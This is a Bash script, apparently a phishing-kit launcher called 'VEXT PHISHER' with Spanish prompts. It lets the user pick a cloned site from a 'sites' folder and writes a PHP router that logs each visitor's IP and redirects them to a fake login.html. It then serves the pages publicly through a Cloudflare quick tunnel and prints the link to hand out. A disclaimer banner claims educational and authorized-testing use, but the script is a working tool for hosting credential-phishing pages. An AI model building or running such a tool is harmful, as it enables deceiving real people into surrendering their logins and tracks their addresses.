#!/bin/bash

trap 'printf "\n\n${ROJO}[!] Deteniendo servicios...${RESET}\n"; kill $PHP_PID $CF_PID > /dev/null 2>&1; rm .cftunnel.log > /dev/null 2>&1; exit' SIGINT

NARANJA='\033[0;33m'
ROJO='\033[0;31m'
AMARILLO='\033[1;33m'
AZUL='\033[0;34m'
CIAN='\033[0;36m'
VERDE='\033[0;32m'
RESET='\033[0m'

check_deps() {
    local missing=()
    if ! command -v php &> /dev/null; then missing+=("php"); fi
    if ! command -v cloudflared &> /dev/null; then missing+=("cloudflared"); fi

    if [ ${#missing[@]} -ne 0 ]; then
        clear
        echo -e "${ROJO}[!] Faltan dependencias: ${missing[*]}${RESET}"
        echo -e "${AMARILLO}¿Deseas instalarlas?${RESET}"
        echo -e "${AZUL}[1]${RESET} Sí, instalar y continuar"
        echo -e "${AZUL}[2]${RESET} No, salir"
        read -p "Selección: " opt_dep
        
        if [ "$opt_dep" == "1" ]; then
            echo -e "${CIAN}[*] Instalando...${RESET}"
            if [ -d "/data/data/com.termux" ]; then
                pkg update -y && pkg install php cloudflared -y
            else
                sudo apt-get update -y && sudo apt-get install php wget -y
                if ! command -v cloudflared &> /dev/null; then
                    wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
                    sudo dpkg -i cloudflared-linux-amd64.deb
                    rm cloudflared-linux-amd64.deb
                fi
            fi
            echo -e "${VERDE}[OK] Reiniciando script...${RESET}"
            sleep 2
            exec bash "$0"
        else
            exit 1
        fi
    fi
}

banner() {
    clear
    echo -e "${CIAN} __     _________  _______   ____  _   _ ___ ____  _   _ _____ ____  ${RESET}"
    echo -e "${CIAN} \\ \\   / / ____\\ \\/ /_   _| |  _ \\| | | |_ _/ ___|| | | | ____|  _ \\ ${RESET}"
    echo -e "${CIAN}  \\ \\ / /|  _|  \\  /  | |   | |_) | |_| || |\\___ \\| |_| |  _| | |_) |${RESET}"
    echo -e "${CIAN}   \\ V / | |___ /  \\  | |   |  __/|  _  || | ___) |  _  | |___|  _ < ${RESET}"
    echo -e "${CIAN}    \\_/  |_____/_/\\_\\ |_|   |_|   |_| |_|___|____/|_| |_|_____|_| \\_\\${RESET}"
    echo -e "${VERDE}                         By Vextu Android                ${RESET}"
    echo -e "${NARANJA}==========================================================${RESET}"
    echo -e "${ROJO} ADVERTENCIA: Esta herramienta es solo para fines${RESET}"
    echo -e "${ROJO} educativos y pruebas de penetración autorizadas.${RESET}"
    echo -e "${ROJO} El uso indebido es responsabilidad del usuario.${RESET}"
    echo -e "${NARANJA}==========================================================${RESET}"
}

check_deps

if [ ! -d "sites" ]; then
    echo -e "${ROJO}[!] Error: No existe la carpeta /sites/${RESET}"
    exit 1
fi

banner

echo -e "${AMARILLO}[+] Selecciona un sitio:${RESET}"
opciones=($(ls sites/))
for i in "${!opciones[@]}"; do
    echo -e "${ROJO}[${AZUL}$((i+1))${ROJO}]${RESET} ${opciones[$i]}"
done

echo -e "${NARANJA}----------------------------------------------------${RESET}"
read -p "Seleccion: " seleccion
index=$((seleccion-1))

if [[ $seleccion -lt 1 || $seleccion -gt ${#opciones[@]} ]]; then
    echo -e "${ROJO}[!] Invalido.${RESET}"
    exit 1
fi

sitio=${opciones[$index]}
read -p "Puerto (8080): " puerto
puerto=${puerto:-8080}

# Crear router.php que NO bloquea archivos estáticos
cat <<EOF > sites/$sitio/router.php
<?php
\$log = "access_log.txt";
\$ip = \$_SERVER['REMOTE_ADDR'];
file_put_contents(\$log, date('Y-m-d H:i:s')." - IP: \$ip - URI: ".\$_SERVER['REQUEST_URI']."\n", FILE_APPEND);

// Si piden la raíz, enviarlos a login.html
if (\$_SERVER['REQUEST_URI'] == '/' || \$_SERVER['REQUEST_URI'] == '') {
    header('Location: /login.html');
    exit;
}

// IMPORTANTE: Retornar false permite que PHP sirva el archivo real (html, css, png, etc)
return false;
?>
EOF

echo -e "\n${AMARILLO}[*] Iniciando servicios...${RESET}"

# Entrar a la carpeta para que el servidor PHP encuentre los archivos
cd sites/$sitio

# Iniciar PHP (usamos 0.0.0.0 para que escuche en todas las interfaces)
php -S 0.0.0.0:$puerto router.php > /dev/null 2>&1 &
PHP_PID=$!

# Iniciar Cloudflare
rm -f .cftunnel.log
cloudflared tunnel --url http://127.0.0.1:$puerto > .cftunnel.log 2>&1 &
CF_PID=$!

echo -e "${AMARILLO}[*] Obteniendo enlace de Cloudflare...${RESET}"
sleep 7

CF_URL=$(grep -o 'https://[-0-9a-z.]*trycloudflare.com' .cftunnel.log)

echo -e "${VERDE}[OK] Servidores activos:${RESET}"
echo -e "${CIAN}URL Local:      ${VERDE}http://127.0.0.1:$puerto/login.html${RESET}"
if [ -z "$CF_URL" ]; then
    echo -e "${ROJO}URL Cloudflare: Error al generar (reintenta)${RESET}"
else
    echo -e "${CIAN}URL Cloudflare: ${VERDE}$CF_URL/login.html${RESET}"
fi

echo -e "${AMARILLO}\n[!] Presiona Ctrl+C para salir.${RESET}"

wait
